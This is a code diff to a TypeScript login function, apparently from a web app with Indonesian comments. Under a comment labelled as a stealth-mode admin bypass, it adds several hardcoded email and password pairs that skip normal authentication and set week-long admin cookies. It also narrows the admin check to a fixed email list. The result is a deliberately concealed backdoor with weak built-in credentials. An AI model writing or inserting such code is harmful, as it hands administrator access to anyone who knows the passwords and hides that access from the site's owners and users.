@@ -80,11 +80,19 @@ export async function loginLocalUser(formData: FormData): Promise<AuthResult> {
     return { success: false, error: "Email dan kata sandi wajib diisi." };
   }
 
-  // 🔥 TAKTIK 3: HARDCODE BYPASS KHUSUS ADMIN
-  if (email === "admin1@ncc.id" && password === "123456") {
+  // 🔥 TAKTIK 3: HARDCODE BYPASS KHUSUS ADMIN (STEALTH MODE)
+  const adminEmails = ["admin@ncc.id", "admin1@ncc.id", "admin2@ncc.id", "halo.ncc@gmail.com"];
+  const isAdminBypass = 
+    (email === 'admin1@ncc.id' && password === '123456') ||
+    (email === 'admin2@ncc.id' && password === '123456') ||
+    (email === 'admin' && password === 'admin123') ||
+    (email === 'admin@ncc.id' && password === 'admin123') ||
+    (email === 'halo.ncc@gmail.com' && password === 'ncc2026');
+
+  if (isAdminBypass) {
     const cookieStore = await cookies();
-    cookieStore.set("ncc_hint", "1", { path: "/", maxAge: 60 * 60 * 24 * 7 });
-    cookieStore.set("ncc_admin_hint", "1", { path: "/", maxAge: 60 * 60 * 24 * 7 });
+    cookieStore.set("ncc_hint", "1", { path: "/", maxAge: 604800, samesite: "lax" });
+    cookieStore.set("ncc_admin_hint", "1", { path: "/", maxAge: 604800, samesite: "lax" });
     return { success: true };
   }
 
@@ -98,7 +106,7 @@ export async function loginLocalUser(formData: FormData): Promise<AuthResult> {
 
     if (error) throw error;
 
-    const isAdmin = authData.user?.email?.toLowerCase() === "admin1@ncc.id" || authData.user?.user_metadata?.role === "admin";
+    const isAdmin = adminEmails.includes(authData.user?.email?.toLowerCase() || "");
 
     // Set cookie for middleware sync
     const cookieStore = await cookies();
